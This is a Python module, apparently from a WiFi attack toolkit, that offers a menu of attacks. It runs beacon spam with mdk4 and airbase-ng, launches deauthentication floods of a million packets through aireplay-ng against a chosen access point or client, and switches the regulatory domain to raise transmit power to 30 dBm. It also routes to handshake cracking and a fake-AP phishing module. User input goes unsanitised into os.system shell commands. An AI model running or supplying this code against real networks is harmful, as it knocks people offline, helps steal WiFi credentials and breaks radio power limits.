import os
import subprocess
import shutil
import time
from pathlib import Path
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel



console = Console()

def menu(interface: str) -> None:
    """Display the attacks menu and route to the selected attack module."""
    while True:
        console.print("\n[bold red]WiFi Attacks[/]")
        console.print("[cyan]1.[/] Beacon Spam")
        console.print("[cyan]2.[/] Deauth Flood")
        console.print("[cyan]3.[/] Auto Handshake + Crack (Wifite)")
        console.print("[cyan]4.[/] Manual 4-Way Handshake Capture")
        console.print("[cyan]5.[/] Crack Existing Handshake")
        console.print("[cyan]6.[/] Phishing Attack (Fake AP)")
        console.print("[cyan]7.[/] Return to Main Menu")

        choice = Prompt.ask("Select attack")

        if choice == "1":
            beacon_spam(interface)
        elif choice == "2":
            deauth_flood(interface)
        elif choice == "3":
            from modules.handshake import auto_attack
            auto_attack(interface)
        elif choice == "4":
            from modules.handshake_attack import capture_handshake
            capture_handshake(interface)
        elif choice == "5":
            from modules.crack_handshake import crack_handshake
            crack_handshake()
        elif choice == "6":
            # Add user confirmation before starting phishing server
            confirm = Prompt.ask("[red]Are you sure you want to launch the Fake AP phishing server? (y/n)[/]", choices=["y","n"], default="n")
            if confirm == "y":
                from modules.fake_ap import start_fake_ap
                start_fake_ap(interface)
            else:
                console.print("[yellow]Phishing attack cancelled.[/]")
        elif choice == "7":
            break
        else:
            console.print("[bold red]Invalid choice[/]")



def beacon_spam(interface: str) -> None:
    """Perform beacon spam attack with optional deauth and TX power boost."""
    from pathlib import Path

    # Define category paths
    wordlist_dir = Path("wordlists")
    category_paths = {
        "1": wordlist_dir / "public_wifi.txt",
        "2": wordlist_dir / "home_isp.txt",
        "3": wordlist_dir / "establishments.txt",
        "4": wordlist_dir / "combined.txt",
        "5": wordlist_dir / "rickroll_ssids.txt",
    }

    console.print(Panel("[bold cyan]📶 Choose SSID Broadcast Category:[/]\n"
                        "[1] Public WiFi / Barangay WiFi\n"
                        "[2] Home & ISP Networks\n"
                        "[3] Establishments\n"
                        "[4] All of the above\n"
                        "[5] Rick Roll"))

    category = Prompt.ask("Enter choice", choices=list(category_paths.keys()), default="1")
    ssid_file = str(category_paths[category])
    channel = Prompt.ask("[green]Channel to use (e.g. 6)", default="6")
    mode = Prompt.ask("[green]Flood mode", choices=["spam", "rotate"], default="spam")
    boost = Prompt.ask("[green]TX Power Boost to 30 dBm? (y/n)", choices=["y", "n"], default="y")
    deauth_enable = Prompt.ask("[red]Enable simultaneous deauth attack? (y/n)", choices=["y", "n"], default="n")

    # Apply monitor mode
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type monitor")
    os.system(f"sudo ip link set {interface} up")
    os.system(f"sudo iwconfig {interface} channel {channel}")

    # Optional TX boost
    if boost == "y":
        os.system("sudo iw reg set BO")
        os.system(f"sudo iwconfig {interface} txpower 30")

    # Optional Deauth Attack
    deauth_proc = None
    if deauth_enable == "y":
        broadcast = Prompt.ask("[red]Deauth all clients on an AP? (y/n)", choices=["y", "n"], default="y")
        bssid = Prompt.ask("[yellow]Enter BSSID of target AP")
        if broadcast == "y":
            deauth_cmd = f"sudo aireplay-ng --deauth 1000000 -a {bssid} {interface}"
        else:
            client = Prompt.ask("[yellow]Enter Client MAC")
            deauth_cmd = f"sudo aireplay-ng --deauth 1000000 -a {bssid} -c {client} {interface}"
        console.print(f"[bold red]💥 Launching deauth in background...[/]")
        deauth_proc = subprocess.Popen(deauth_cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # --- Start spam mode ---
    if mode == "spam":
        if shutil.which("mdk4"):
            console.print(Panel(f"[bold magenta]⚡ Starting mdk4 spam with: {ssid_file}[/]"))
            try:
                subprocess.call(["sudo", "mdk4", interface, "b", "-f", ssid_file, "-c", channel])
            except KeyboardInterrupt:
                console.print("[bold red]⛔ Beacon spam stopped.")
        else:
            console.print("[bold red]❌ mdk4 not found! Try rotate mode.")

    # --- Start rotate mode ---
    elif mode == "rotate":
        with open(ssid_file) as f:
            ssids = [line.strip() for line in f if line.strip()]
        hold_time = int(Prompt.ask("[green]Seconds per SSID?", default="5"))
        try:
            while True:
                for ssid in ssids:
                    console.print(f"[cyan]📶 Broadcasting:[/] {ssid}")
                    subprocess.Popen(["sudo", "airbase-ng", "-e", ssid, "-c", channel, interface],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(hold_time)
                    os.system("sudo pkill airbase-ng")
        except KeyboardInterrupt:
            os.system("sudo pkill airbase-ng")
            console.print("[bold red]⛔ Rotating beacon stopped.")

    # Cleanup
    if deauth_proc:
        deauth_proc.terminate()
        console.print("[bold yellow]🛑 Deauth stopped.")



def deauth_flood(interface: str) -> None:
    """Perform a deauthentication flood attack on a target AP or client."""
    from rich.panel import Panel

    console.print(Panel("[bold red]💥 Deauthentication Attack Setup[/]"))

    # Ask for options
    boost = Prompt.ask("[green]Boost TX Power to 30 dBm? (y/n)", choices=["y", "n"], default="y")
    broadcast = Prompt.ask("[red]Deauth all clients on AP? (y/n)", choices=["y", "n"], default="y")
    bssid = Prompt.ask("[yellow]Enter target AP BSSID (e.g. CC:B1:82:4B:31:98)")
    channel = Prompt.ask("[cyan]Enter the channel of the target AP (e.g. 6)")

    # Set the channel before attack
    os.system(f"sudo iwconfig {interface} channel {channel}")

    # Optional TX power boost
    if boost == "y":
        os.system("sudo iw reg set BO")
        os.system(f"sudo iwconfig {interface} txpower 30")

    # Build aireplay-ng command
    if broadcast == "y":
        cmd = f"sudo aireplay-ng --deauth 1000000 -a {bssid} {interface}"
    else:
        client = Prompt.ask("[yellow]Enter target Client MAC")
        cmd = f"sudo aireplay-ng --deauth 1000000 -a {bssid} -c {client} {interface}"

    # Start attack
    console.print(f"\n[bold red]⚡ Launching deauth flood on channel {channel}... Press CTRL+C to stop.[/]\n")
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        console.print("[bold red]⛔ Deauth flood stopped.")



def targeted_deauth(interface: str) -> None:
    """Perform a targeted deauthentication attack on a specific client and AP."""
    bssid = Prompt.ask("Enter BSSID (AP)")
    client = Prompt.ask("Enter Client MAC")
    os.system(f"sudo aireplay-ng --deauth 100 -a {bssid} -c {client} {interface}")
